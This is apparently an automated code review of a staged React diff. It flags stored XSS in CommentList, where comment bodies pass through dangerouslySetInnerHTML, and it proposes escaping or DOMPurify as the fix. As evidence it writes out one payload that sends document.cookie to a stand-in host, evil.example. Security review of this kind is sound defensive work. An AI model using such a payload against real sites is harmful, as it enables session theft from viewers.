**Scope:** staged (git diff --cached)

## Intent

**Intent:** inferred: render each comment's body, with line breaks, under its author in `CommentList` (diff).
**Requirements:** none stated.
**Scope creep:** not judged: no source states a requirement.
**Sources not read:** none.

## What Was Done Well

- The test is extended to assert the new body output (`getByText('Hello')`) alongside the author.
- The list keeps its stable `key={comment.id}`.
- The component and its props are fully typed under `strict` TypeScript.

## Findings

### Security — Critical

**Location:** `src/components/CommentList.tsx:9`
**Issue:** `comment.body` is injected as raw HTML through `dangerouslySetInnerHTML`. Only `\n` is replaced with `<br>`, and nothing escapes or sanitizes the rest of the string. This is the stack-precedent exception for `dangerouslySetInnerHTML`: React's default escaping does not apply.
**Evidence:** A commenter submits the body `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">` → `CommentList` renders it as markup, the `onerror` handler runs in every viewer's browser, and the result is stored XSS (session theft, actions as the viewer). Verification checked `CommentList.tsx` and the only other files in the repo (the test, `package.json`, `tsconfig.json`). The `Comment` type is `body: string`, there is no sanitizer dependency and nothing in the component escapes the value. The repo has no caller that could sanitize upstream.
**Confidence:** High
**Fix:** Render the body as text and produce the line breaks in JSX, so React escapes it. For example, `<p style={{ whiteSpace: 'pre-line' }}>{comment.body}</p>` or split on `\n` and join with `<br />` elements. If HTML must be supported, sanitize it with a maintained library such as DOMPurify before passing it to `__html`.

### Tests/Coverage — Suggestion

**Location:** `src/components/CommentList.test.tsx:6-10`
**Issue:** The test covers only a single-line plain-text body. It does not cover the newline-to-`<br>` conversion that the change adds, or a body that contains markup.
**Evidence:** A change that breaks the `\n` handling, or that lets `<script>`/`<img onerror>` through, still passes `getByText('Hello')`, so a regression like the finding above would go unnoticed.
**Confidence:** High
**Fix:** Add a case with `'a\nb'` that asserts the line break, and a case with a body like `<img src=x onerror=...>` that asserts it is rendered as text and not as an element.

## Summary

| Category              | Critical | Warning | Suggestion | N/A |
|-----------------------|----------|---------|------------|-----|
| Security              | 1        | 0       | 0          |     |
| Performance           | 0        | 0       | 0          |     |
| Tests/Coverage        | 0        | 0       | 1          |     |
| Architecture          | 0        | 0       | 0          |     |
| Code & File Size      | 0        | 0       | 0          |     |
| Potential Bugs        | 0        | 0       | 0          |     |
| Accessibility         | 0        | 0       | 0          |     |
| Observability         |          |         |            | N/A |
| API Design            |          |         |            | N/A |
| Resilience            |          |         |            | N/A |
| DB Migrations         |          |         |            | N/A |
| Concurrency           |          |         |            | N/A |
| i18n                  |          |         |            | N/A |
| Privacy/Compliance    |          |         |            | N/A |
| Architecture Patterns |          |         |            | N/A |
| Stack-Specific        | 0        | 0       | 0          |     |
| **Total**             | **1**    | **0**   | **1**      |     |

**Verification:** 1 Critical/Warning candidates checked, 0 refuted.

**Review effort:** 1/5 — up to 50 changed lines in 2 files; no risk area.
**Relevant tests:** changed — `src/components/CommentList.test.tsx` renders one comment and asserts that the author and the body text `Hello` appear; it leaves out multi-line bodies and bodies that contain markup. Execution: not run.
**Look first:** `src/components/CommentList.tsx` (raw HTML from `comment.body` at line 9, stored XSS), `src/components/CommentList.test.tsx` (no test for newlines or markup).
**Ready to merge:** No — 1 Critical finding must be fixed before merging.

## Audit

**Files reviewed:** 2 of 2 changed files: `src/components/CommentList.test.tsx`, `src/components/CommentList.tsx`.
**Read for context:** `package.json`, `skill:references/accessibility.md`, `skill:references/intent.md`, `skill:stacks/react.md`, `skill:stacks/typescript.md`, `tsconfig.json`.
**Checked with no findings:** Performance, Architecture, Code & File Size, Potential Bugs, Accessibility, Stack-Specific.
**Not verified:** nothing.
